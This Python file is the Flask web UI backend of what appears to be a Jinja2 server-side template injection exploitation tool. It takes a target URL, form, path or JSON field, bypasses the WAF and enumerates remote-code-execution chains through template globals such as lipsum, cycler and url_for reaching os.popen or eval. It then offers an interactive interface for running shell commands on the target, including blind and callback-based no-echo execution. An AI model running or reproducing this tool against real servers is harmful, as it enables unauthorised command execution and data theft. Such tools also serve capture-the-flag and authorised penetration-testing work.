"""webui后台的实现"""

import copy
import dataclasses
import logging
import threading
import time
import webbrowser
import uuid

from urllib.parse import urlparse
from typing import Union
from os import environ
from platform import system

from flask import Flask, render_template, request, jsonify

from .const import (
    DetectMode,
    ReplacedKeywordStrategy,
    TemplateEnvironment,
    DetectWafKeywords,
    PythonVersion,
    CALLBACK_GENERATE_FULLPAYLOAD,
    CALLBACK_GENERATE_PAYLOAD,
    CALLBACK_PREPARE_FULLPAYLOADGEN,
    CALLBACK_SUBMIT,
    CALLBACK_TEST_FORM_INPUT,
    APICODE_OK,
    APICODE_WRONG_INPUT,
    DEFAULT_USER_AGENT,
    OS_POPEN_READ,
    CONFIG,
    FUNCTION_CALL,
    ATTRIBUTE,
    ITEM,
    CHAINED_ATTRIBUTE_ITEM,
    CLASS_ATTRIBUTE,
    JINJA_CONTEXT_VAR,
    FLASK_CONTEXT_VAR,
    STRING,
)
from .cracker import Cracker, guess_is_flask, guess_python_version
from .options import Options
from .form import get_form, Form
from .full_payload_gen import FullPayloadGen
from .job import build_no_echo_full_payload_gen, do_submit_cmdexec
from .no_echo import NoEchoExecutor
from . import payload_gen as payload_gen_module
from .requester import HTTPRequester
from .scan_url import yield_form
from .submitter import Submitter, FormSubmitter, PathSubmitter, JsonSubmitter
import json


logger = logging.getLogger("webui")
app = Flask(__name__)
tasks = {}
create_time_lock = threading.Lock()
last_create_task_time = 0


class CallBackLogger:
    """利用callback收集信息并以日志的形式保存的类"""

    def __init__(self, flash_messages, messages):
        self.flash_messages = flash_messages
        self.messages = messages

    def _set_latest_submit_message(self, message: str):
        submit_prefixes = (
            "提交表单失败！",
            "提交payload失败！",
            "提交payload完成，",
            "提交表单完成，",
        )
        self.flash_messages[:] = [
            item
            for item in self.flash_messages
            if not item.startswith(submit_prefixes)
        ]
        self.flash_messages.append(message)

    def callback_prepare_fullpayloadgen(self, data):
        """收集FullPayloadGen准备好后的信息"""
        self.messages.append("上下文payload测试完毕。")
        if data["context"]:
            context_repr = ", ".join(
                f"{k}={repr(v)}" for k, v in data["context"].items()
            )
            self.messages.append(f"以下是在上下文中的值：{context_repr}")
        else:
            self.messages.append("没有上下文payload可以通过waf。。。")
        if not data["will_print"]:
            self.messages.append("生成的payload将不会具有回显。")

    def callback_generate_fullpayload(self, data):
        """收集FullPayloadGen生成payload的结果"""
        payload = data["payload"]
        preview = payload if len(payload) < 30 else payload[:30] + "..."
        self.messages.append(f"分析完毕，为{data['gen_type']}生成payload: {preview}")
        self.messages.append(f"完整payload如下：{payload}")
        if not data["will_print"]:
            self.messages.append("payload将不会产生回显")

    def callback_generate_payload(self, data):
        """收集PayloadGen生成payload的中间结果"""
        return

    def callback_submit(self, data):
        """收集表单的提交结果"""
        if not data["response"]:
            if data.get("type", None) == "form":
                self._set_latest_submit_message(
                    f"提交表单失败！输入为{data['inputs']}，表单为{data['form']}"
                )
            elif data.get("type", None) == "path":
                self._set_latest_submit_message(
                    f"提交payload失败！链接为{data['url']}，payload为{data['payload']}"
                )
            elif data.get("type", None) == "json":
                self._set_latest_submit_message(
                    f"提交payload失败！链接为{data['url']}，payload为{data['json']}"
                )
            else:
                self._set_latest_submit_message("提交payload失败！")
        else:
            status_code = data["response"].status_code
            if data.get("type", None) == "form":
                self._set_latest_submit_message(
                    f"提交表单完成，返回值为{status_code}，输入为{data['inputs']}，表单为{data['form']}"
                )
            elif data.get("type", None) == "json":
                self._set_latest_submit_message(
                    f"提交表单完成，返回值为{status_code}，输入为{data['json']}"
                )
            else:
                self._set_latest_submit_message(
                    f"提交payload完成，返回值为{status_code}，提交payload为{data['payload']}"
                )

    def callback_test_form_input(self, data):
        """收集测试表单的结果"""
        if not data["ok"]:
            return
        testsuccess_msg = (
            "payload测试成功！" if data["test_success"] else "payload测试失败。"
        )
        will_print_msg = "其会产生回显。" if data["will_print"] else "其不会产生回显。"
        self.messages.append(testsuccess_msg + will_print_msg)

    def __call__(self, callback_type, data):
        def default_handler(_):
            return logger.warning(
                "callback_type=%s not found", callback_type, extra={"highlighter": None}
            )

        return {
            CALLBACK_PREPARE_FULLPAYLOADGEN: self.callback_prepare_fullpayloadgen,
            CALLBACK_GENERATE_FULLPAYLOAD: self.callback_generate_fullpayload,
            CALLBACK_GENERATE_PAYLOAD: self.callback_generate_payload,
            CALLBACK_SUBMIT: self.callback_submit,
            CALLBACK_TEST_FORM_INPUT: self.callback_test_form_input,
        }.get(callback_type, default_handler)(data)


class BaseCrackTaskThread(threading.Thread):
    def __init__(self):
        super().__init__()
        self.flash_messages = []
        self.messages = []
        self.chain_messages = []
        self.callback = CallBackLogger(self.flash_messages, self.messages)
        self.success = False
        self.ready = False
        self.submitter: Union[Submitter, None] = None
        self.full_payload_gen: Union[FullPayloadGen, None] = None
        self.cracker: Union[Cracker, None] = None
        self.initial_crack_result = None
        self.chain_generators = []
        self.chain_families = []

    def success_message(self, no_echo=False):
        if no_echo:
            return "WAF已绕过，已进入无回显利用模式，现在可以执行命令了"
        return "WAF已绕过，现在可以执行Shell指令了"


    def crack_submitter(
        self,
        url: str,
        requester: HTTPRequester,
        submitter: Submitter,
    ) -> Union[FullPayloadGen, None]:
        resolved_options = resolve_webui_options(
            url=url,
            requester=requester,
            submitter=submitter,
            options=self.options,
        )
        self.submitter = submitter
        self.cracker = Cracker(
            self.submitter,
            self.callback,
            options=resolved_options,
        )

        if resolved_options.no_echo.enabled:
            self.messages.append("已启用无回显模块，强制使用无回显链路")
            full_payload_gen = build_no_echo_full_payload_gen(
                self.submitter,
                resolved_options,
                self.callback,
            )
            if full_payload_gen is None:
                self.messages.append("无回显模块初始化失败")
            self.initial_crack_result = None
            return full_payload_gen

        has_response = self.cracker.has_respond()
        if not has_response:
            return None
        detailed = self.cracker.crack_detailed()
        if detailed is None:
            return None
        self.initial_crack_result = detailed
        return detailed.full_payload_gen

    def record_initial_chain(self):
        if self.full_payload_gen is None:
            return
        self.chain_generators = [self.full_payload_gen]
        self.chain_families = []
        if self.initial_crack_result is not None:
            payload = self.initial_crack_result.payload
        else:
            payload, _ = self.full_payload_gen.generate(OS_POPEN_READ, Cracker.test_cmd)
            payload = payload or "<链路已建立，但暂未生成预览payload>"
        self.chain_families.append(detect_chain_family(payload))
        self.chain_messages.append(f"[可利用链路1]：{payload}")

    def explore_additional_chains(self, max_results: int = 6):
        if self.cracker is None or self.initial_crack_result is None:
            return
        self.messages.append("已找到第一条可用链路，后台继续枚举更多利用链路")
        found = 0
        for index, result in enumerate(
            self.cracker.enumerate_successful_chains(
                initial_result=self.initial_crack_result,
                max_results=max_results,
            ),
            start=2,
        ):
            found += 1
            self.chain_generators.append(result.full_payload_gen)
            self.chain_families.append(detect_chain_family(result.payload))
            self.messages.append(
                f"发现候选链路#{index}，probe={result.probe}，payload长度 {len(result.payload)}"
            )
            self.chain_messages.append(f"[可利用链路{index}]：{result.payload}")
        self.messages.append(f"链路枚举完成，新增发现 {found} 条候选链路")


def clone_submitter(submitter: Submitter, callback=None) -> Submitter:
    if isinstance(submitter, FormSubmitter):
        cloned = FormSubmitter(
            submitter.url,
            submitter.form,
            submitter.target_field,
            submitter.req,
            callback,
            tamperers=list(submitter.tamperers),
        )
        cloned.extra_params = submitter.extra_params.copy()
        return cloned
    if isinstance(submitter, PathSubmitter):
        cloned = PathSubmitter(
            submitter.url,
            submitter.req,
            callback,
            tamperers=list(submitter.tamperers),
        )
        cloned.extra_params = submitter.extra_params.copy()
        return cloned
    if isinstance(submitter, JsonSubmitter):
        cloned = JsonSubmitter(
            submitter.url,
            submitter.method,
            copy.deepcopy(submitter.json_obj),
            submitter.key,
            submitter.req,
            callback,
            tamperers=list(submitter.tamperers),
        )
        cloned.extra_params = submitter.extra_params.copy()
        return cloned
    submitter.callback = callback if callback else (lambda *_: None)
    return submitter


def clone_full_payload_gen(
    full_payload_gen: FullPayloadGen,
    callback=None,
) -> FullPayloadGen:
    cloned = FullPayloadGen(
        full_payload_gen.waf_func,
        callback=callback,
        options=copy.deepcopy(full_payload_gen.options),
        waf_expr_func=full_payload_gen.waf_expr_func,
    )
    cloned.prepared = full_payload_gen.prepared
    cloned.extra_context_vars_prepared = full_payload_gen.extra_context_vars_prepared
    cloned.added_extra_context_vars = set(full_payload_gen.added_extra_context_vars)
    cloned.outer_pattern = full_payload_gen.outer_pattern
    cloned.will_print = full_payload_gen.will_print
    cloned.context_vars = copy.deepcopy(full_payload_gen.context_vars)
    if full_payload_gen.payload_gen is not None and cloned.context_vars is not None:
        cloned.payload_gen = payload_gen_module.PayloadGenerator(
            full_payload_gen.waf_func,
            cloned.context_vars.get_context(),
            callback,
            options=cloned.options,
            waf_expr_func=cloned.waf_expr_func,
            generated_exprs=full_payload_gen.payload_gen.generated_exprs.copy(),
        )
        cloned.payload_gen.used_count = full_payload_gen.payload_gen.used_count.copy()
    return cloned


def detect_chain_family(payload: str) -> str:
    lowered = payload.lower()
    if "lipsum.__globals__.__builtins__.eval" in lowered:
        return "lipsum_builtins_eval"
    if "cycler.next.__globals__.os" in lowered:
        return "cycler_next_os"
    if "cycler.reset.__globals__.os" in lowered:
        return "cycler_reset_os"
    if "cycler.__init__.__globals__.os" in lowered:
        return "cycler_init_os"
    if "joiner.__init__.__globals__.os" in lowered:
        return "joiner_init_os"
    if "namespace.__init__.__globals__.os" in lowered:
        return "namespace_init_os"
    if "session.get.__globals__.os" in lowered:
        return "session_get_os"
    if "request.close.__globals__.os" in lowered:
        return "request_close_os"
    if "g.pop.__globals__.os" in lowered:
        return "g_pop_os"
    if "g.get.__globals__.os" in lowered:
        return "g_get_os"
    if "url_for.__globals__.os" in lowered:
        return "url_for_os"
    if "config.__class__.__init__.__globals__.os" in lowered:
        return "config_init_os"
    if "lipsum.__globals__.os" in lowered:
        return "lipsum_os"
    return "generic"


def build_os_chain_target(chain_family: str):
    family_targets = {
        "lipsum_os": (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "lipsum"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        ),
        "cycler_next_os": (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "cycler"),
            (ATTRIBUTE, "next"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        ),
        "cycler_reset_os": (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "cycler"),
            (ATTRIBUTE, "reset"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        ),
        "cycler_init_os": (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "cycler"),
            (ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        ),
        "joiner_init_os": (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "joiner"),
            (ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        ),
        "namespace_init_os": (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "namespace"),
            (ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        ),
        "session_get_os": (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "session"),
            (ATTRIBUTE, "get"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        ),
        "request_close_os": (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "request"),
            (ATTRIBUTE, "close"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        ),
        "g_pop_os": (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "g"),
            (ATTRIBUTE, "pop"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        ),
        "g_get_os": (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "g"),
            (ATTRIBUTE, "get"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        ),
        "url_for_os": (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "url_for"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        ),
        "config_init_os": (
            CHAINED_ATTRIBUTE_ITEM,
            (CONFIG,),
            (CLASS_ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        ),
    }
    return family_targets.get(chain_family)


def generate_payload_by_family(
    full_payload_gen: FullPayloadGen,
    chain_family: str,
    cmd: str,
):
    if chain_family == "lipsum_builtins_eval":
        builtins_target = (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "lipsum"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
        )
        code = f"__import__('os').popen({cmd!r}).read()"
        return full_payload_gen.generate(
            FUNCTION_CALL,
            (ITEM, builtins_target, "eval"),
            [(STRING, code)],
        )

    os_target = build_os_chain_target(chain_family)
    if os_target is not None:
        popen_call = (
            FUNCTION_CALL,
            (ATTRIBUTE, os_target, "popen"),
            [(STRING, cmd)],
        )
        return full_payload_gen.generate(
            FUNCTION_CALL,
            (ATTRIBUTE, popen_call, "read"),
            [],
        )

    return full_payload_gen.generate(OS_POPEN_READ, cmd)


def manage_task_thread(task: threading.Thread):
    """启动task(一个线程)，并为其分配一个id"""
    taskid = uuid.uuid4().hex
    task.daemon = True
    task.start()
    tasks[taskid] = task
    return taskid


def request_form_value(request_form, key: str, default=None):
    for candidate in (key, key.replace("_", "-"), key.replace("-", "_")):
        value = request_form.get(candidate, None)
        if value not in (None, ""):
            return value
    return default


def parse_bool(value, default=False) -> bool:
    if value is None:
        return default
    if isinstance(value, bool):
        return value
    return str(value).strip().lower() in {"1", "true", "yes", "on"}


def parse_int(value, default: int) -> int:
    if value in (None, ""):
        return default
    try:
        return int(value)
    except (TypeError, ValueError):
        return default


def parse_float(value, default: float) -> float:
    if value in (None, ""):
        return default
    try:
        return float(value)
    except (TypeError, ValueError):
        return default


def parse_options(request_form) -> Options:
    options = Options()

    detect_mode = request_form_value(request_form, "detect_mode")
    if detect_mode:
        options.detect_mode = DetectMode(detect_mode)

    environment = request_form_value(request_form, "environment")
    if environment:
        options.environment = TemplateEnvironment(environment)

    replaced_keyword_strategy = request_form_value(
        request_form, "replaced_keyword_strategy"
    )
    if replaced_keyword_strategy:
        options.replaced_keyword_strategy = ReplacedKeywordStrategy(
            replaced_keyword_strategy
        )

    detect_waf_keywords = request_form_value(request_form, "detect_waf_keywords")
    if detect_waf_keywords:
        options.detect_waf_keywords = DetectWafKeywords(detect_waf_keywords)

    options.no_echo.enabled = parse_bool(
        request_form_value(request_form, "no_echo"), False
    )
    options.no_echo.outbound_enabled = parse_bool(
        request_form_value(request_form, "outbound_enabled"), True
    )
    options.no_echo.callback_url = request_form_value(
        request_form, "no_echo_callback_url"
    )
    options.no_echo.receiver_api = request_form_value(
        request_form, "no_echo_receiver_api"
    )
    options.no_echo.listen_host = request_form_value(
        request_form, "no_echo_listen_host", options.no_echo.listen_host
    )
    options.no_echo.listen_port = parse_int(
        request_form_value(request_form, "no_echo_listen_port"),
        options.no_echo.listen_port,
    )
    options.no_echo.probe_timeout = parse_float(
        request_form_value(request_form, "no_echo_probe_timeout"),
        options.no_echo.probe_timeout,
    )
    options.no_echo.poll_interval = parse_float(
        request_form_value(request_form, "no_echo_poll_interval"),
        options.no_echo.poll_interval,
    )
    options.no_echo.chunk_size = parse_int(
        request_form_value(request_form, "no_echo_chunk_size"),
        options.no_echo.chunk_size,
    )
    options.no_echo.blind_delay = parse_float(
        request_form_value(request_form, "no_echo_blind_delay"),
        options.no_echo.blind_delay,
    )
    options.no_echo.blind_threshold = parse_float(
        request_form_value(request_form, "no_echo_blind_threshold"),
        options.no_echo.blind_threshold,
    )
    options.no_echo.blind_max_length = parse_int(
        request_form_value(request_form, "no_echo_blind_max_length"),
        options.no_echo.blind_max_length,
    )
    options.no_echo.command_timeout = parse_float(
        request_form_value(request_form, "no_echo_command_timeout"),
        options.no_echo.command_timeout,
    )
    options.no_echo.dns_domain = request_form_value(
        request_form, "no_echo_dns_domain"
    )
    options.no_echo.dnslog_command = request_form_value(
        request_form, "no_echo_dnslog_command"
    )
    options.no_echo.waf_keyword = request_form_value(
        request_form, "no_echo_waf_keyword"
    )
    options.no_echo.ok_keyword = request_form_value(
        request_form, "no_echo_ok_keyword"
    )
    return options


def resolve_webui_options(
    url: str,
    requester: HTTPRequester,
    submitter: Submitter,
    options: Options,
) -> Options:
    python_version, python_subversion = (
        guess_python_version(url, requester)
        if options.python_version == PythonVersion.UNKNOWN
        else (options.python_version, options.python_subversion)
    )
    environment = options.environment
    if options.environment == TemplateEnvironment.JINJA2:
        environment = (
            TemplateEnvironment.FLASK
            if guess_is_flask(submitter)
            else TemplateEnvironment.JINJA2
        )
    return dataclasses.replace(
        options,
        environment=environment,
        python_version=python_version,
        python_subversion=python_subversion,
    )


class CrackTaskThread(BaseCrackTaskThread):
    def __init__(self, url, form: Form, interval: float, options: Options):
        super().__init__()
        self.form = form
        self.url = url
        self.options = options
        self.submitter = None
        self.full_payload_gen = None
        self.cracker = None
        self.requester = HTTPRequester(interval=interval, user_agent=DEFAULT_USER_AGENT)

    def run(self):
        for input_field in self.form["inputs"]:
            self.messages.append(f"开始分析表单项{input_field}")
            submitter = FormSubmitter(
                self.url,
                self.form,
                input_field,
                self.requester,
                self.callback,
            )
            self.full_payload_gen = self.crack_submitter(
                self.url,
                self.requester,
                submitter,
            )
            if self.full_payload_gen:
                self.messages.append(self.success_message(self.options.no_echo.enabled))
                self.success = True
                self.ready = True
                self.record_initial_chain()
                self.explore_additional_chains()
                break
        if not self.success:
            self.messages.append("WAF绕过失败")


class CrackPathTaskThread(BaseCrackTaskThread):
    def __init__(self, url, interval: float, options: Options):
        super().__init__()
        self.url = url
        self.options = options
        self.submitter = None
        self.full_payload_gen = None
        self.cracker = None
        self.requester = HTTPRequester(interval=interval, user_agent=DEFAULT_USER_AGENT)

    def run(self):
        submitter = PathSubmitter(self.url, self.requester, self.callback)
        self.full_payload_gen = self.crack_submitter(
            self.url,
            self.requester,
            submitter,
        )
        if not self.full_payload_gen:
            self.messages.append("WAF绕过失败")
            return
        self.messages.append(self.success_message(self.options.no_echo.enabled))
        self.success = True
        self.ready = True
        self.record_initial_chain()
        self.explore_additional_chains()


class CrackJsonTaskThread(BaseCrackTaskThread):
    def __init__(
        self,
        url,
        method: str,
        json_data: str,
        key: str,
        interval: float,
        options: Options,
    ):
        super().__init__()
        self.url = url
        self.method = method
        self.json_data = json_data
        self.key = key
        self.options = options
        self.submitter = None
        self.full_payload_gen = None
        self.cracker = None
        self.requester = HTTPRequester(interval=interval, user_agent=DEFAULT_USER_AGENT)

    def run(self):
        json_obj = json.loads(self.json_data)
        submitter = JsonSubmitter(
            self.url,
            self.method,
            json_obj,
            self.key,
            self.requester,
            self.callback,
        )
        self.full_payload_gen = self.crack_submitter(
            self.url,
            self.requester,
            submitter,
        )
        if not self.full_payload_gen:
            self.messages.append("WAF绕过失败")
            return
        self.messages.append(self.success_message(self.options.no_echo.enabled))
        self.success = True
        self.ready = True
        self.record_initial_chain()
        self.explore_additional_chains()


class ScanTaskThread(BaseCrackTaskThread):
    def __init__(self, url, interval: float, options: Options):
        super().__init__()
        self.url = url
        self.options = options
        self.submitter = None
        self.full_payload_gen = None
        self.cracker = None
        self.requester = HTTPRequester(interval=interval, user_agent=DEFAULT_USER_AGENT)

    def run(self):
        url_forms = (
            (page_url, form)
            for (page_url, forms) in yield_form(self.requester, self.url)
            for form in forms
        )
        for page_url, form in url_forms:
            for input_field in form["inputs"]:
                self.messages.append(f"开始分析表单项{input_field}")
                submitter = FormSubmitter(
                    page_url,
                    form,
                    input_field,
                    self.requester,
                    self.callback,
                )
                self.full_payload_gen = self.crack_submitter(
                    page_url,
                    self.requester,
                    submitter,
                )
                if self.full_payload_gen:
                    self.messages.append(
                        self.success_message(self.options.no_echo.enabled)
                    )
                    self.success = True
                    self.ready = True
                    self.record_initial_chain()
                    self.explore_additional_chains()
                    return
        if not self.success:
            self.messages.append("WAF绕过失败")


class InteractiveTaskThread(threading.Thread):
    def __init__(
        self,
        submitter: Submitter,
        full_payload_gen: FullPayloadGen,
        cmd: str,
        chain_index: int = 1,
        chain_family: str = "generic",
    ):
        super().__init__()
        self.flash_messages = []
        self.messages = []
        self.callback = CallBackLogger(self.flash_messages, self.messages)

        self.submitter = clone_submitter(submitter, self.callback)
        self.full_payload_gen = clone_full_payload_gen(full_payload_gen, self.callback)
        self.cmd = cmd
        self.chain_index = chain_index
        self.chain_family = chain_family
        self.options = self.full_payload_gen.options

    def run(self):
        if self.options.no_echo.enabled:
            self.messages.append(f"开始执行无回显命令，使用可利用链路{self.chain_index}")
            executor = NoEchoExecutor(
                submitter=self.submitter,
                payload_generator=self.full_payload_gen,
                options=self.options.no_echo,
            )
            try:
                result = executor.execute(self.cmd)
            except Exception as exc:  # pylint: disable=W0718
                self.messages.append(f"无回显命令执行失败：{exc}")
            else:
                self.messages.append("无回显命令执行结果如下：")
                self.messages.append(result)
            finally:
                executor.close()
            return

        self.messages.append(f"开始生成payload，使用可利用链路{self.chain_index}")
        payload, will_print = generate_payload_by_family(
            self.full_payload_gen,
            self.chain_family,
            self.cmd,
        )
        if payload is None:
            self.messages.append("链路对应payload生成失败")
            return
        self.messages.append(f"分析完毕，为os_popen_read生成payload: {payload[:30] + ('...' if len(payload) > 30 else '')}")
        self.messages.append(f"完整payload如下：{payload}")
        if not will_print:
            self.messages.append("payload将不会产生回显")
        response = self.submitter.submit(payload)
        self.messages.append("提交payload的回显如下：")
        self.messages.append("" if response is None else response.text)


@app.route("/")
def index():
    """渲染主页"""
    return render_template("crack.jinja2")


@app.route("/crack-path")
def crack_path():
    """渲染攻击路径的页面"""
    return render_template("crack-path.jinja2")


@app.route("/crack-json")
def crack_json():
    """渲染攻击路径的页面"""
    return render_template("crack-json.jinja2")


@app.route("/scan")
def scan():
    """渲染攻击路径的页面"""
    return render_template("scan.jinja2")


@app.route(
    "/createTask",
    methods=["POST"],
)
def create_task():
    """创建攻击任务"""
    global last_create_task_time
    with create_time_lock:
        duration = time.perf_counter() - last_create_task_time
        if duration < 0.1:
            time.sleep(0.1 - duration)
        last_create_task_time = time.perf_counter()
    task_type = request.form.get("type", None)
    if task_type == "crack":
        if request.form["url"] == "" or request.form["inputs"] == "":
            return jsonify(
                {
                    "code": APICODE_WRONG_INPUT,
                    "message": "URL and inputs should not be empty, but you provide "
                    + f"url={request.form['url']} and inputs={request.form['inputs']}",
                }
            )
        taskid = manage_task_thread(
            CrackTaskThread(
                url=request.form["url"],
                form=get_form(
                    action=request.form["action"] or urlparse(request.form["url"]).path,
                    method=request.form["method"],
                    inputs=request.form["inputs"].split(","),
                ),
                interval=float(request.form["interval"]),
                options=parse_options(request.form),
            )
        )
        return jsonify({"code": APICODE_OK, "taskid": taskid})
    if task_type == "crack-path":
        if request.form["url"] == "":
            return jsonify(
                {"code": APICODE_WRONG_INPUT, "message": "URL should not be empty."}
            )
        taskid = manage_task_thread(
            CrackPathTaskThread(
                url=request.form["url"],
                interval=float(request.form["interval"]),
                options=parse_options(request.form),
            )
        )
        return jsonify({"code": APICODE_OK, "taskid": taskid})
    if task_type == "scan":
        if request.form["url"] == "":
            return jsonify(
                {"code": APICODE_WRONG_INPUT, "message": "URL should not be empty."}
            )
        taskid = manage_task_thread(
            ScanTaskThread(
                url=request.form["url"],
                interval=float(request.form["interval"]),
                options=parse_options(request.form),
            )
        )
        return jsonify({"code": APICODE_OK, "taskid": taskid})
    if task_type == "crack-json":
        if (
            request.form["url"] == ""
            or request.form["json_data"] == ""
            or request.form["key"] == ""
        ):
            return jsonify(
                {
                    "code": APICODE_WRONG_INPUT,
                    "message": "URL, JSON data and key should not be empty",
                }
            )
        try:
            json.loads(request.form["json_data"])
        except json.JSONDecodeError:
            return jsonify(
                {"code": APICODE_WRONG_INPUT, "message": "Invalid JSON data provided"}
            )
        taskid = manage_task_thread(
            CrackJsonTaskThread(
                url=request.form["url"],
                method=request.form.get("method", "POST"),
                json_data=request.form["json_data"],
                key=request.form["key"],
                interval=float(request.form["interval"]),
                options=parse_options(request.form),
            )
        )
        return jsonify({"code": APICODE_OK, "taskid": taskid})
    if task_type == "interactive":
        cmd, last_task_id = (
            request.form["cmd"],
            request.form["last_task_id"],
        )
        last_task = tasks.get(last_task_id, None)
        if cmd == "":
            return jsonify(
                {
                    "code": APICODE_WRONG_INPUT,
                    "message": "cmd should not be empty",
                }
            )
        elif not isinstance(last_task, BaseCrackTaskThread):
            return jsonify(
                {
                    "code": APICODE_WRONG_INPUT,
                    "message": f"last_task_id not found: {last_task_id}",
                }
            )
        elif not (last_task.success or last_task.ready):
            return jsonify(
                {
                    "code": APICODE_WRONG_INPUT,
                    "message": f"specified task is not ready yet: {last_task_id}",
                }
            )
        try:
            chain_index = int(request.form.get("chain_index", "1"))
        except ValueError:
            return jsonify(
                {
                    "code": APICODE_WRONG_INPUT,
                    "message": "chain_index should be an integer",
                }
            )
        if chain_index < 1 or chain_index > len(last_task.chain_generators):
            return jsonify(
                {
                    "code": APICODE_WRONG_INPUT,
                    "message": f"chain_index out of range: {chain_index}",
                }
            )
        assert last_task.submitter is not None
        taskid = manage_task_thread(
            InteractiveTaskThread(
                last_task.submitter,
                last_task.chain_generators[chain_index - 1],
                cmd,
                chain_index=chain_index,
                chain_family=last_task.chain_families[chain_index - 1],
            )
        )
        return jsonify({"code": APICODE_OK, "taskid": taskid})
    return jsonify(
        {
            "code": APICODE_WRONG_INPUT,
            "message": f"unknown type {request.form.get('type', None)}",
        }
    )


@app.route(
    "/watchTask",
    methods=[
        "POST",
    ],
)
def watch_task():
    """异步获取任务（一个线程）的运行状态"""
    if "taskid" not in request.form:
        return jsonify({"code": APICODE_WRONG_INPUT, "message": "taskid not provided"})
    if request.form["taskid"] not in tasks:
        return jsonify(
            {
                "code": APICODE_WRONG_INPUT,
                "message": f"task not found: {request.form['taskid']}",
            }
        )
    taskid = request.form["taskid"]
    task: Union[
        CrackTaskThread, CrackPathTaskThread, CrackJsonTaskThread, InteractiveTaskThread
    ] = tasks[taskid]
    if isinstance(task, BaseCrackTaskThread):
        return jsonify(
            {
                "code": APICODE_OK,
                "taskid": taskid,
                "done": not task.is_alive(),
                "messages": task.messages,
                "flash_messages": task.flash_messages,
                "chain_messages": task.chain_messages,
                "success": task.success,
                "ready": task.ready,
            }
        )
    if isinstance(task, InteractiveTaskThread):
        return jsonify(
            {
                "code": APICODE_OK,
                "taskid": taskid,
                "done": not task.is_alive(),
                "messages": task.messages,
                "flash_messages": task.flash_messages,
            }
        )
    assert False, "This line should not be run, check code."


def should_open_browser() -> bool:
    if system() == "Windows":
        return True
    return environ.get("DISPLAY") is not None


def browser_open_url_delayed(url, delay):
    def f():
        time.sleep(delay)
        try:
            webbrowser.open(url)
        except webbrowser.Error:
            logger.warning("Open browser failed", extra={"highlighter": None})

    t = threading.Thread(target=f)
    t.daemon = True
    t.start()


def main(host="127.0.0.1", port=11451, open_browser=True):
    """启动webui服务器"""
    if open_browser and should_open_browser():
        browser_open_url_delayed(f"http://{host}:{port}", 0.5)
    app.run(host=host, port=port)


if __name__ == "__main__":
    main()
